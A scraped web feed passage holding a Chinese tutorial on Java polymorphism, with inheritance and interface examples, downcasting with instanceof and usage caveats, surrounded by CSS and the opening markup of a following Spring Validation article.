ALJuTdAp0nWyMTsunS2QNukbpwOcRaPpvOHvxzQow2ZBvrs+nsfLL8o0QQBJFdMO1XGkEjaIQlQCMsD/YIGkEjLAEaYXmwR9AIGmEJ0AjLgz2CRtAIS4BGWB7sETSCRlgCNMLyYI+gETTCEqARlgd7BI2gEZYAjbA82CNoBI2wBGiE5cEeQSNohCVAIywP9ggaQSMsARphebBH0AgaYQnQCMsjYC5SF2agYi2fTWcPGA7VFfO0n8+mswdMyOrCNJwnpz/P6xqZkE2Xzh4w8qcLI4Hbu/dydvkWBRAAQBZk0uOOyKyzp5PARRiF1puNtR+NTh+oMCvtJ+D8F2N6j6x+PrwzG46gRTDDm5BtsAGBg0X924Qfj7i23p7HNgQAAAAASUVORK5CYII=");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">1.引言</h2>
<p>在 Java 面向对象的三大核心特性（封装、继承、多态）中，多态是体现代码灵活性与扩展性的关键。它允许程序在运行时根据对象的实际类型动态调用对应的方法，实现了 “一个接口，多种实现” 的编程思想。</p>
<h3 data-id="heading-1">2.多态的基础语法</h3>
<p>多态并非孤立存在的特性，它依赖<code>继承 / 实现、方法重写、父类引用指向子类对象</code>这三个核心条件，三者缺一不可。我们先从基础语法层面拆解多态的实现逻辑。</p>
<h4 data-id="heading-2">2.1 核心前提：继承或接口实现</h4>
<p>多态的本质是 “类型的向上转型”，而向上转型的前提是类与类之间存在继承关系，或类与接口之间存在实现关系。​</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-comment">// 定义父类：Animal</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeSound</span><span class="hljs-params">()</span> {
System.out.println(<span class="hljs-string">"动物发出基础叫声"</span>);
   }
}
<span class="hljs-comment">// 定义子类：Dog，继承自Animal</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> {}
<span class="hljs-comment">// 定义子类：Cat，继承自Animal</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> {}
</code></pre>
<h4 data-id="heading-3">2.2 关键条件：方法重写</h4>
<p>多态需要子类对父类的方法进行重写，以此实现 “同一行为，不同表现”。方法重写需遵循 “两同两小一大” 规则（方法名、参数列表相同；子类返回值范围更小、异常范围更小；子类访问权限更大）</p>
<h4 data-id="heading-4">2.3 核心操作：父类引用指向子类对象</h4>
<p>这是多态的直观体现，通过向上转型，让父类类型的变量指向子类的实例，程序在运行时会自动识别对象的实际类型，调用对应的重写方法</p>
<h3 data-id="heading-5">三、多态的核心知识点及常用方法</h3>
<h4 data-id="heading-6">3.1 多态的两种实现形式</h4>
<p>Java 中多态主要分为类继承多态和接口实现多态，其中接口多态在实际开发中应用更为广泛。</p>
<h4 data-id="heading-7">3.1.1 类继承多态</h4>
<p>基于类的继承关系实现，如上文的Animal与Dog、Cat的案例。这种形式适用于有明确父子类层级的场景，代码示例如下：</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-comment">// 定义父类：交通工具</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Vehicle</span> {
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
System.out.println(<span class="hljs-string">"交通工具启动"</span>);
    }
}
<span class="hljs-comment">// 子类：汽车</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Car</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Vehicle</span> {
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
System.out.println(<span class="hljs-string">"汽车在公路上飞驰"</span>);
    }
}
<span class="hljs-comment">// 子类：自行车</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Bike</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Vehicle</span> {
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
System.out.println(<span class="hljs-string">"自行车在小道上骑行"</span>);
  }
}
<span class="hljs-comment">// 测试类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassInheritPolymorphism</span> {
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
<span class="hljs-type">Vehicle</span> <span class="hljs-variable">v1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>();
<span class="hljs-type">Vehicle</span> <span class="hljs-variable">v2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bike</span>();
  }
}
</code></pre>
<h4 data-id="heading-8">3.1.2 接口实现多态</h4>
<p>基于接口与实现类的关系实现，接口定义行为规范，不同实现类提供差异化实现，是框架开发的常用模式。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-comment">// 定义接口：支付接口</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Payable</span> {
<span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span>; <span class="hljs-comment">// 支付行为规范</span>
}
<span class="hljs-comment">// 实现类：支付宝支付</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AliPay</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Payable</span> {
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> {
System.out.println(<span class="hljs-string">"使用支付宝支付了"</span> + amount + <span class="hljs-string">"元"</span>);
   }
}
<span class="hljs-comment">// 实现类：微信支付</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WeChatPay</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Payable</span> {
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pay</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> {
System.out.println(<span class="hljs-string">"使用微信支付了"</span> + amount + <span class="hljs-string">"元"</span>);
  }
}
<span class="hljs-comment">// 测试类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterfacePolymorphism</span> {
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
<span class="hljs-comment">// 接口引用指向实现类对象</span>
<span class="hljs-type">Payable</span> <span class="hljs-variable">pay1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AliPay</span>();
<span class="hljs-type">Payable</span> <span class="hljs-variable">pay2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeChatPay</span>();
pay1.pay(<span class="hljs-number">100.0</span>); <span class="hljs-comment">// 输出：使用支付宝支付了100.0元</span>
pay2.pay(<span class="hljs-number">50.0</span>); <span class="hljs-comment">// 输出：使用微信支付了50.0元</span>
  }
}
</code></pre>
<h4 data-id="heading-9">3.2 多态的核心方法：向下转型与 <code>instanceof</code> 关键字</h4>
<p>在多态场景中，父类引用无法直接调用子类的特有方法，此时需要通过向下转型实现，但转型前需用instanceof关键字判断对象实际类型，避免ClassCastException。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownCastDemo</span> {
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
<span class="hljs-type">Animal</span> <span class="hljs-variable">animal</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();
animal.makeSound(); <span class="hljs-comment">// 可调用重写的方法</span>
<span class="hljs-comment">// 子类Dog特有方法：fetch（捡东西）</span>
<span class="hljs-comment">// animal.fetch(); // 编译报错，父类引用无法调用子类特有方法</span>
<span class="hljs-comment">// 先判断类型，再向下转型</span>
<span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> Dog) {
<span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> (Dog) animal;
dog.fetch(); <span class="hljs-comment">// 调用子类特有方法</span>
      }
   }
}
<span class="hljs-comment">// 为Dog类添加特有方法</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> {
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">makeSound</span><span class="hljs-params">()</span> {
System.out.println(<span class="hljs-string">"小狗发出“汪汪”声"</span>);
  }
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fetch</span><span class="hljs-params">()</span> {
System.out.println(<span class="hljs-string">"小狗帮主人捡起了玩具"</span>);
  }
}
</code></pre>
<h4 data-id="heading-10">3.3 多态的典型应用：统一方法参数</h4>
<p>利用多态可以统一方法的参数类型，让方法具备更强的通用性，无需为每个子类单独定义方法。</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PolymorphismParamDemo</span> {
<span class="hljs-comment">// 统一的“动物叫声播放”方法，参数为父类类型</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">playSound</span><span class="hljs-params">(Animal animal)</span> {
animal.makeSound();
  }
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
playSound(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>()); <span class="hljs-comment">// 输出：小狗发出“汪汪”声</span>
playSound(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>()); <span class="hljs-comment">// 输出：小猫发出“喵喵”声</span>
playSound(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>()); <span class="hljs-comment">// 输出：动物发出基础叫声</span>
   }
}
</code></pre>
<h3 data-id="heading-11">四、多态使用的注意事项</h3>
<ol>
<li>
<p><strong>成员访问规则</strong>：多态场景下，成员变量的访问遵循 “编译看左边，运行看左边”（即父类引用只能访问父类的成员变量）；成员方法遵循 “编译看左边，运行看右边”（运行时调用子类重写的方法），二者需严格区分。</p>
</li>
<li>
<p><strong>静态方法无多态</strong>：静态方法属于类而非对象，不会被重写，父类引用调用静态方法时，始终执行父类的静态方法，与子类无关。</p>
</li>
<li>
<p><strong>向下转型需谨慎</strong>：未做类型判断的强制向下转型会引发ClassCastException，必须先用instanceof校验对象实际类型。</p>
</li>
<li>
<p><strong>构造方法无多态</strong>：构造方法是创建对象的特殊方法，无法被重写，因此不具备多态特性，子类构造时会先调用父类构造方法。</p>
</li>
<li>
<p><strong>抽象类与接口的多态差异</strong>：抽象类可包含普通方法和抽象方法，适合抽取子类共性；接口仅定义行为规范，适合实现多类别的行为扩展，需根据业务场景选择。</p>
</li>
</ol>
<h3 data-id="heading-12">五、总结</h3>
<p>本文围绕 Java 多态展开深度解析，其核心知识点可归纳为以下 3 点：</p>
<ol>
<li>实现三要素：多态必须同时满足继承 / 接口实现、方法重写、父类 / 接口引用指向子类 / 实现类对象，三者共同构成了多态的基础。</li>
<li>两种核心形式：类继承多态适用于有明确层级的类结构，接口实现多态是业务扩展与框架开发的主流选择，可灵活适配不同业务场景。</li>
<li>关键操作与规范：向下转型需结合instanceof做类型校验，同时要区分成员变量与成员方法的访问规则，规避静态方法无多态等常见误区。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Validation教程]]></title>    <link>https://juejin.cn/post/7581324707481616425</link>    <guid>https://juejin.cn/post/7581324707481616425</guid>    <pubDate>2025-12-09T05:38:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581324707481616425" data-draft-id="7581413562485817350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Validation教程"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-09T05:38:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户030480591263"/> <meta itemprop="url" content="https://juejin.cn/user/3793762867478852"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Validation教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3793762867478852/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户030480591263
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:38:49.000Z" title="Tue Dec 09 2025 05:38:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 